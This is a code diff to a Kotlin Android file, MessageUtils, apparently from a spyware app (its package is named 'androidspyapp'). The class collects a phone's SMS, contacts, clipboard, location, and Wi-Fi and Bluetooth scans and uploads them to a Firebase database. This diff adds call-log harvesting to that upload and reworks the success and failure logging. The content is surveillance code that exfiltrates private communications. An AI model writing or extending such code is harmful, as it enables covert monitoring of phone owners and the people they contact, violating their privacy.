@@ -4,10 +4,9 @@ import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
 import android.util.Log
-import com.google.android.gms.tasks.OnCompleteListener
-import com.google.android.gms.tasks.Task
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
+import com.komnacki.androidspyapp.calllog.CalllogState
 import com.komnacki.androidspyapp.contacts.ContactsState
 import com.komnacki.androidspyapp.device.battery.BatteryState
 import com.komnacki.androidspyapp.device.bluetooth.BluetoothState
@@ -33,9 +32,14 @@ class MessageUtils {
     private val LOCATION_DATABASE_TAG = "LOCATION"
     private val SMS_DATABASE_TAG = "SMS"
     private val CONTACTS_DATABASE_TAG = "CONTACTS"
+    private val CALLLOG_DATABASE_TAG = "CALL_LOG"
     private val WIFI_LIST_DATABASE_TAG = "WIFI_LIST"
     private val BLUETOOTH_LIST_DATABASE_TAG = "BLUETOOTH_LIST"
     private val CLIPBOARD_DATABASE_TAG = "CLIPBOARD"
+
+    enum class StateChange {
+        NOT_CHANGE, CHANGE_TO_ENABLED
+    }
 
     companion object {
         lateinit var userEmail: String
@@ -49,7 +53,7 @@ class MessageUtils {
 
     fun getBaseHeader(): DatabaseReference {
         val easyConfigMode = EasyConfigMod(context)
-        val currDate = SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(Date())
+        val currDate = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
         val currTime = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
         Log.d("KK: ", "currDate: " + currDate)
         Log.d("KK: ", "currTime: " + currTime)
@@ -62,11 +66,13 @@ class MessageUtils {
     }
 
     fun sendData(
+        wifiStateChange: StateChange,
+        bluetoothName: String,
         wifiScanResult: List<WifiScanResult>?,
         bluetoothScanResult: List<BluetoothScanResult>?
     ) {
         val batteryState = BatteryState(context)
-        val bluetoothState = BluetoothState(context)
+        val bluetoothState = BluetoothState(context, bluetoothName)
         val configState = ConfigState(context)
         val networkState = NetworkState(context)
         val memoryState = MemoryState(context)
@@ -75,6 +81,7 @@ class MessageUtils {
         val locationState = LocationState(context)
         val smsState = SmsState(context)
         val contactsState = ContactsState(context)
+        val calllogState = CalllogState(context)
 
 
         val values = mutableMapOf<String, Any>()
@@ -120,6 +127,10 @@ class MessageUtils {
         contactsState.getData().forEach { item ->
             values[CONTACTS_DATABASE_TAG + "/" + item.key] = item.value
         }
+        Log.d("KK: ", "write callog")
+        calllogState.getData().forEach { item ->
+            values[CALLLOG_DATABASE_TAG + "/" + item.key] = item.value
+        }
 
 
         Log.d("KK: ", "write wifi")
@@ -150,31 +161,25 @@ class MessageUtils {
         sendClipboardContent(values)
 
         Log.d("KK: ", "updateChildren")
+        //todo: odblokuj do wysylania
         getBaseHeader().updateChildren(values)
-            .addOnCompleteListener(object : OnCompleteListener<Void> {
-                override fun onComplete(p0: Task<Void>) {
-                    Log.d("KK: ", "update childrens complete!")
-                }
-            })
-//        val transactionHandler = object : Transaction.Handler {
-//            override fun onComplete(p0: DatabaseError?, p1: Boolean, p2: DataSnapshot?) {
-//                Log.d("KK: ", "onComplete transaction")
-//            }
+            .addOnSuccessListener {
+                Log.d("KK: ", "-------------- ON SUCCESS ----------------------")}
+            .addOnFailureListener { exception ->
+                Log.d("KK: ", "-------------- ON FAILED ----------------------")
+                Log.e("KK: ", "error: " + exception.message) }
+            .addOnCompleteListener {
+                Log.d("KK: ", "-------------- ON COMPLETE ----------------------")
+            }
+
+
+
 //
-//            override fun doTransaction(p0: MutableData): Transaction.Result {
-//                p0.child(BATTERY_DATABASE_TAG)
-//                batteryState.getData(context).forEach { item ->
-//                    Log.d("KK: ", "for each: " + item.toString())
-//                    p0.child(item.key).value = item.value
+//            .addOnCompleteListener(object : OnCompleteListener<Void> {
+//                override fun onComplete(p0: Task<Void>) {
+//                    Log.d("KK: ", "update childrens complete!")
 //                }
-//                p0.
-//
-//                return Transaction.success(p0)
-//            }
-//        }
-//
-//        getBaseHeader()
-//            .runTransaction(transactionHandler)
+//            })
     }
 
     private fun sendClipboardContent(values: MutableMap<String, Any>) {
